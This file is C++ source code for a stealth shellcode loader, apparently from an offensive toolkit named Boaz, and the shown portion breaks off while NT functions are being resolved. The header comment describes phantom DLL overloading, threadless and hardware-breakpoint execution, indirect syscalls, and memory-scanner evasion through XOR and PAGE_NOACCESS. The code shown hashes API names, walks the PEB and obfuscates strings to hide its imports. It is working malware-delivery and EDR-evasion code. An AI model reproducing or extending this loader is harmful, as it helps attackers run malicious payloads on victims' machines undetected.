
/****
 * Stealth NZ loader: a APC write method with custom phantom DLL overloading
 * Threadless execution
 * With option -ldr to add PEB to module list to evade Moneta
 * Local inejction only 
 * Add indirect syscall with Halo's gate method to replace NT functions used. 
 * Novelty: Add exception handler to set the debug registers WITHOUT setThreadContext. 
 * Alternatives: using SEH, calling a invalid address, hook ntdll!KiUserExceptionDispatcher, RoP to int 3 (0xCC) or set page guard to enter the exception handler to set the debug registers.
 * page guard requires STATUS_GUARD_PAGE_VIOLATION and int 3 requires STATUS_SINGLE_STEP.
 * A valid address will trigger STATUS_ACCESS_VIOLATION. All can lead to exception handler and set debug registers. 
 * x86Matthew's method of stealth hook on sub-function's global pointer can also create 'places' to set debug registers. 
 * 
 * Code execution using hardware breakpoint to bypass kernel call back memory scan on 
 * Start address of thread created, decoy thread start address pointed to a invalid place
 * and trigger a hardware breakpoint exception. The exception handler will then
 * redirect the execution to the real thread start address, but XOR the magic code memory
 * and then change the page permission to PAGE_NOACCESS when the syscall of NtCreateThreadex is reached. 
 * the exception handler will then change the page permission back to PAGE_EXECUTE_READWRITE, XOR the magic code
 * and then change the page permission to PAGE_EXECUTE_READ. The magiccode will be resumed at that point. 
 * We actually hooked the ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk functions instead of NtReateThreadEx to extend the range of stealth. ntdll!RtlUserThreadStart is the first function called by every new thread, and it typically calls kernel32!BaseThreadInitThunk. The Sifu memory guard will apply XOR, PAGE_NOACCESS with real thread start address, but the "LPTHREAD_START_ROUTINE lpStartAddress" will be pointed to the decoy thread start address for both of the functions.
 *  Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse. 
 * 
 * 
 * New execution method: use VEH to set up breakpoints Dr0~Dr3, Dr7. Then use VCH to execute the code. So, no registers and stack pointer and instruction pointer changed in VEH. 

 * This technique can be applied to other NT functions as well.
 * Author: Thomas X Meng
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
 * 
*/
#include <windows.h>
#include <winternl.h> 
#include <psapi.h>
#include <stdlib.h> 
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>
#include <cstring>

///For dynamic loading: 
#include <stdint.h>
#include "processthreadsapi.h"
#include "libloaderapi.h"
#include <winnt.h>
#include <lmcons.h>
// #include "HardwareBreakpoints.h"
/// PEB module loader:
#include "pebutils.h"

//Define a marco global vaariable of PVOID:
#define DECLARE_GLOBAL_PTR(varName) \
    PVOID varName = NULL;

// Use the macro to declare a global variable
DECLARE_GLOBAL_PTR(globalPointer);
#define NATIVE_VALUE ULONGLONG
#define DEBUG_REGISTER_EXEC_DR0 0x1
#define DEBUG_REGISTER_EXEC_DR1 0x4
#define DEBUG_REGISTER_EXEC_DR2 0x10
#define DEBUG_REGISTER_EXEC_DR3 0x40

#define SINGLE_STEP_FLAG 0x100
#define CURRENT_EXCEPTION_STACK_PTR e->ContextRecord->Rsp
#define CURRENT_EXCEPTION_INSTRUCTION_PTR e->ContextRecord->Rip
#define SINGLE_STEP_FLAG 0x100

typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);

// Standalone function to delay execution using WaitForSingleObjectEx
void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); 
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE);
        CloseHandle(hEvent); 
    }
}

const wchar_t* GetDllNameFromPath(const wchar_t* dllPath) {
    const wchar_t* dllName = wcsrchr(dllPath, L'\\');
    if (dllName) {
        return dllName + 1; // Move past the backslash
    }
    return dllPath; // If no backslash found, the path is already the DLL name
}

typedef struct _LDR_DATA_TABLE_ENTRY_FREE {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    _ACTIVATION_CONTEXT *EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_FREE, *PLDR_DATA_TABLE_ENTRY_FREE;

// Function to change the path of a loaded DLL in the PEB
// BOOL ChangeDllPath(HMODULE hModule, const wchar_t* newPath) {
//     // Get the PEB address
//     PROCESS_BASIC_INFORMATION pbi;
//     ULONG len;
//     NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
//     if (status != 0) {
//         wprintf(L"Failed to get PEB address. Status: %lx\n", status);
//         return FALSE;
//     }

//     // Get the LDR data
//     PPEB_LDR_DATA ldr = pbi.PebBaseAddress->Ldr;
//     PLIST_ENTRY list = &ldr->InMemoryOrderModuleList;

//     // Traverse the list to find the module
//     for (PLIST_ENTRY entry = list->Flink; entry != list; entry = entry->Flink) {
//         PLDR_DATA_TABLE_ENTRY_FREE dataTable = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
//         if (dataTable->DllBase == hModule) {
//             // Modify the FullDllName
//             size_t newPathLen = wcslen(newPath) * sizeof(wchar_t);
//             memcpy(dataTable->FullDllName.Buffer, newPath, newPathLen);
//             dataTable->FullDllName.Length = (USHORT)newPathLen;
//             dataTable->FullDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);

//             // Modify the BaseDllName if needed
//             wchar_t* baseName = wcsrchr(newPath, L'\\');
//             if (baseName) {
//                 baseName++;
//                 newPathLen = wcslen(baseName) * sizeof(wchar_t);
//                 memcpy(dataTable->BaseDllName.Buffer, baseName, newPathLen);
//                 dataTable->BaseDllName.Length = (USHORT)newPathLen;
//                 dataTable->BaseDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);
//             }
//             return TRUE;
//         }
//     }

//     wprintf(L"Module not found in PEB.\n");
//     return FALSE;
// }



void ManualInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    DestinationString->Length = wcslen(SourceString) * sizeof(WCHAR);
    DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)SourceString;
}


typedef enum _THREAD_STATE_CHANGE_TYPE
{
    ThreadStateChangeSuspend,
    ThreadStateChangeResume,
    ThreadStateChangeMax,
} THREAD_STATE_CHANGE_TYPE, *PTHREAD_STATE_CHANGE_TYPE;


typedef NTSTATUS (NTAPI *pNtCreateThreadStateChange)(
    PHANDLE ThreadStateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ThreadHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeThreadState)(
    HANDLE ThreadStateChangeHandle,
    HANDLE ThreadHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtCreateProcessStateChange)(
    PHANDLE StateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeProcessState)(
    HANDLE StateChangeHandle,
    HANDLE ProcessHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead
);


////// Test alert: 

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

/////////////////////////////////// Dynamic loading: 
#define ADDR unsigned __int64

uint32_t crc32c(const char *s) {
    int      i;
    uint32_t crc=0;
    
    while (*s) {
        crc ^= (uint8_t)(*s++ | 0x20);
        
        for (i=0; i<8; i++) {
            crc = (crc >> 1) ^ (0x82F63B78 * (crc & 1));
        }
    }
    return crc;
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}

namespace dynamic {
    // Dynamically finds the base address of a DLL in memory
    ADDR find_dll_base(const char* dll_name) {
        // Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
        //  and GetModuleHandle which defeats the very purpose of this PoC
        // Well, this is a chicken and egg problem, we have to call those 2 functions stealthly. 
        PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
        PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

        PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        // Iterate through every loaded DLL in the current process
        do {
            PLDR_DATA_TABLE_ENTRY_FREE dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
            char* dllName;
            // Convert unicode buffer into char buffer for the time of the comparison, then free it
            UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
            char* result = strstr(dllName, dll_name);
            CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

            if (result != NULL) {
                // Found the DLL entry in the PEB, return its base address
                return (ADDR)dllEntry->DllBase;
            }
            curr = curr->Flink;
        } while (curr != head);

        return 0;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function
    ADDR find_dll_export(ADDR dll_base, const char* export_name) {
        // Read the DLL PE header and NT header
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

        // The RVA of the export table if indicated in the PE optional header
        // Read it, and read the export table by adding the RVA to the DLL base address in memory
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        // Browse every export of the DLL. For the i-th export:
        // - The i-th element of the name table contains the export name
        // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (int i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
            if (!_strcmpi(funcName, export_name)) {
                return func_ptr;
            }
        }

        return 0;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function by hash
    ADDR find_dll_export_by_hash(ADDR dll_base, uint32_t target_hash) {
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (DWORD i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            uint32_t hash = crc32c(funcName);
            if (hash == target_hash) {
                ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
                return func_ptr;
            }
        }

        return 0; // Function not found
    }


    using LoadLibraryPrototype = HMODULE(WINAPI*)(LPCWSTR);
    LoadLibraryPrototype loadFuture;
    using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
    GetModuleHandlePrototype GetModuleHandle;
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    GetProcAddressPrototype NotGetProcAddress;

    void resolve_imports(void) {

        const char essentialLib[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
        const char EssentialLib[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 };
        const char CrucialLib[] = { 'N', 'T', 'D', 'L', 'L', 0 };
        const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
        const char GetFutureStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
        const char LoadFutureStr[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
        const char GetModuleHandleStr[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
        ADDR kernel32_base = find_dll_base(EssentialLib);
        ADDR ntdll_base = find_dll_base(CrucialLib);
        // Example hashes for critical functions
        uint32_t hash_GetProcAddress = crc32c(GetFutureStr);
        uint32_t hash_LoadLibraryW = crc32c(LoadFutureStr);
        uint32_t hash_GetModuleHandleA = crc32c(GetModuleHandleStr);
        const char NtCreateThreadStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
        uint32_t hash_NtCreateThread = crc32c(NtCreateThreadStr);
        printf("[+] Hash of NtCreateThread: %x\n", hash_NtCreateThread);
        // printf the hash to user:
        printf("[+] Hash of GetProcAddress: %x\n", hash_GetProcAddress);
        printf("[+] Hash of LoadLibraryW: %x\n", hash_LoadLibraryW);

        // Resolve functions by hash
        dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(kernel32_base, hash_GetProcAddress);
        dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(kernel32_base, hash_GetModuleHandleA);
        #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(essentialLib), _name))
        // dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(ntdll_base, hash_GetProcAddress);
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(ntdll_base, hash_GetModuleHandleA);
        // #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        // #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleessentialLibHandle(crucialLib), _name))

        dynamic::loadFuture = (LoadLibraryPrototype) _import(LoadFutureStr, LoadLibraryPrototype);    
        // Verify the resolution
        if (dynamic::NotGetProcAddress != NULL && dynamic::loadFuture != NULL && dynamic::GetModuleHandle != NULL) {
            printf("[+] APIs resolved by hash successfully.\n");
        } else {
            printf("[-] Error resolving APIs by hash.\n");
        }

        // dynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base, "GetProcAddress");
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype) find_dll_export(kernel32_base, "GetModuleHandleA");
        // #define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
        // dynamic::loadFuture = (LoadLibraryPrototype) _import("LoadLibraryW", LoadLibraryPrototype);
        printf("[+] LoadLibrary at: %p\n by stealth phantom loading", loadFuture);
    }
}
////////////////////////////////////
const char* ProtectionToString(DWORD protection) {
    switch (protection) {
        case PAGE_NOACCESS: return "PAGE_NOACCESS";
        case PAGE_READONLY: return "PAGE_READONLY";
        case PAGE_READWRITE: return "PAGE_READWRITE";
        case PAGE_WRITECOPY: return "PAGE_WRITECOPY";
        case PAGE_EXECUTE: return "PAGE_EXECUTE";
        case PAGE_EXECUTE_READ: return "PAGE_EXECUTE_READ";
        case PAGE_EXECUTE_READWRITE: return "PAGE_EXECUTE_READWRITE";
        case PAGE_EXECUTE_WRITECOPY: return "PAGE_EXECUTE_WRITECOPY";
        case PAGE_GUARD: return "PAGE_GUARD";
        case PAGE_NOCACHE: return "PAGE_NOCACHE";
        case PAGE_WRITECOMBINE: return "PAGE_WRITECOMBINE";
        default: return "UNKNOWN";
    }
}


// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder);
BOOL PrintSectionDetails(const wchar_t* dllPath);

void PrintUsageAndExit() {
    wprintf(L"Usage: loader_21.exe [-txf] [-dll <order>] [-h]\n");
    wprintf(L"Options:\n");
    wprintf(L"  -txf                Use Transactional NTFS (TxF) for DLL loading.\n");
    wprintf(L"  -dll <order>        Specify the order of the suitable DLL to use (default is 1). Not all DLLs are suitable for overloading\n");
    wprintf(L"  -h                  Print this help message and exit.\n");
    wprintf(L"  -thread             Use an alternative NT call other than the NT create thread\n");
    wprintf(L"  -pool               Use Threadpool for APC Write\n");
    wprintf(L"  -ldr                use LdrLoadDll instead of NtCreateSection->NtMapViewOfSection\n");
    wprintf(L"  -peb                Use custom function to add loaded module to PEB lists to evade Moneta\n");
    wprintf(L"  -dotnet             Use .NET assemblies instead of regular DLLs\n");
    wprintf(L"  -a                  Switch to PAGE_NOACCESS after write the memory to .text section\n");
    ExitProcess(0);
}


BOOL ValidateDLLCharacteristics(const wchar_t* dllPath, uint32_t requiredSize, bool dotnet = FALSE) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE; // Cannot open file
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[fileSize]; // Allocate buffer for the whole file
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Failed to read file
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }


    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }

    if(dotnet) {
        // Verify it's a .NET assembly by checking the CLR header
        IMAGE_DATA_DIRECTORY* clrDataDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
        if (clrDataDirectory->VirtualAddress == 0 || clrDataDirectory->Size == 0) {
            // Not a .NET assembly
            CloseHandle(hFile);
            delete[] buffer;
            return FALSE;
        }
    }
    // Check if SizeOfImage is sufficient
    if (ntHeaders->OptionalHeader.SizeOfImage < requiredSize) {
        CloseHandle(hFile);
        return FALSE; // Image size is not sufficient
    }

    printf("[+] SizeOfImage: %lu\n", ntHeaders->OptionalHeader.SizeOfImage);

    BOOL textSectionFound = FALSE;
    IMAGE_SECTION_HEADER* sectionHeaders = NULL;
    if(!dotnet) {
        // Validate the .text section specifically
        sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
        // BOOL textSectionFound = FALSE;
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
            if (strncmp((char*)section->Name, ".text", 5) == 0) {
                textSectionFound = TRUE;
                if (section->Misc.VirtualSize < requiredSize) {
                    CloseHandle(hFile);
                    delete[] buffer;
                    return FALSE; // .text section size is not sufficient
                }
                break;
            }
        }
    } else {
        textSectionFound = TRUE;
    }

    if(!dotnet) {
        printf("[+] .text section found: %s\n", textSectionFound ? "Yes" : "No");
        //print the size of the .text section in human readable format:
        printf("[+] .text section size: %lu bytes\n", sectionHeaders->Misc.VirtualSize);
    }

    if (!textSectionFound) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // .text section not found
    }

    CloseHandle(hFile);
    delete[] buffer;
    return TRUE; // DLL is suitable
}


BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder, bool dotnet = FALSE) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t systemDir[MAX_PATH] = { 0 };
    wchar_t searchPath[MAX_PATH] = { 0 };
    int foundCount = 0; // Count of suitable DLLs found

    // Get the system directory path
    if (!GetSystemDirectoryW(systemDir, _countof(systemDir))) {
        wprintf(L"Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Construct the search path for DLLs in the system directory
    swprintf_s(searchPath, _countof(searchPath), L"%s\\*.dll", systemDir);

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to find first file. Error: %lu\n", GetLastError());
        return FALSE;
    }


    if(dotnet) {
        printf("\n [+] Looking for .NET assemblies\n");
    } else {
        printf("\n [+] Looking for suitable candidate DLLs\n");
    }
    do {
        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, _countof(fullPath), L"%s\\%s", systemDir, findData.cFileName);

        if (GetModuleHandleW(findData.cFileName) == NULL && ValidateDLLCharacteristics(fullPath, requiredSize, dotnet)) {
            foundCount++; // Increment the suitable DLL count
            if (foundCount == dllOrder) { // If the count matches the specified order
                // For simplicity, we're not using bTxF here, but you could adjust your logic
                // to use it for filtering or preparing DLLs for TxF based operations.
                // swprintf_s(fullPath, MAX_PATH, L"%s\\%s", systemDir, findData.cFileName);
                wcsncpy_s(dllPath, bufferSize, fullPath, _TRUNCATE);
                FindClose(hFind);
                // TODO:enable the function below if you want to see the statistics of the dll you are going to use:
                // PrintSectionDetails(fullPath);
                return TRUE; // Found the DLL in the specified order
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return FALSE;
}



// Prototype for LdrLoadDll, which is not documented in Windows SDK headers.
typedef NTSTATUS (NTAPI *LdrLoadDll_t)(
    IN PWCHAR               PathToFile OPTIONAL,
    IN ULONG                Flags OPTIONAL,
    IN PUNICODE_STRING      ModuleFileName,
    OUT PHANDLE             ModuleHandle);

// deinfe pRtlExitUserThread:
typedef NTSTATUS (NTAPI *pRtlExitUserThread)(
    NTSTATUS ExitStatus
);

//////////////////////////////////// TxF: 
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientID);


// Define the NT API function pointers
typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);


// define RtlAddVectoredExceptionHandler:
typedef PVOID (WINAPI *RtlAddVectoredExceptionHandler_t)(ULONG First, PVECTORED_EXCEPTION_HANDLER VectoredHandler);
// add definition for AddVectoredContinueHandler:
typedef PVOID (WINAPI *RtlAddVectoredContinueHandler_t)(ULONG First, PVECTORED_EXCEPTION_HANDLER VectoredHandler);

// Prototype for NtWaitForSingleObject
typedef NTSTATUS (__stdcall* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// TODO:
typedef NTSTATUS (__stdcall* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
); 


LdrLoadDll_t LdrLoadDll;
NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;
NtProtectVirtualMemory_t NtProtectVirtualMemory;
NtWaitForSingleObject_t MyNtWaitForSingleObject;
NtQueryInformationProcess_t MyNtQueryInformationProcess;
RtlAddVectoredExceptionHandler_t MyRtlAddVectoredExceptionHandler;
RtlAddVectoredContinueHandler_t MyRtlAddVectoredContinueHandler;


const wchar_t essentialLibW[] = { L'n', L't', L'd', L'l', L'l', 0 };
// Load NT functions
void LoadNtFunctions() {
    dynamic::resolve_imports();
    // Load Library is not a necessity here:
    HMODULE hNtdll = dynamic::loadFuture(essentialLibW);
    // HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

    const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    const char NtCreateFutureStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtFutureTranscationStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'r', 'a', 'n', 's', 'a', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtViewFutureStr[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtProtectFutureMemoryStr[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char LdrLoadDllStr[] = { 'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l', 0 };
    const char NtwaitForSingleObjectStr[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    // for NtQueryInformationProcess
    const char NtQueryInformationProcessStr[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    const char RtlAddHandler[] = { 'R', 't', 'l', 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', 0 };
    const char RtlAddContinueHandler[] = { 'R', 't', 'l', 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'C', 'o', 'n', 't', 'i', 'n', 'u', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'r', 0 };
    //we should output 

    NtCreateSection = (NtCreateSection_t) _import_crucial(NtCreateFutureStr, NtCreateSection_t);
    NtMapViewOfSection = (NtMapViewOfSection_t) _import_crucial(NtViewFutureStr, NtMapViewOfSection_t);
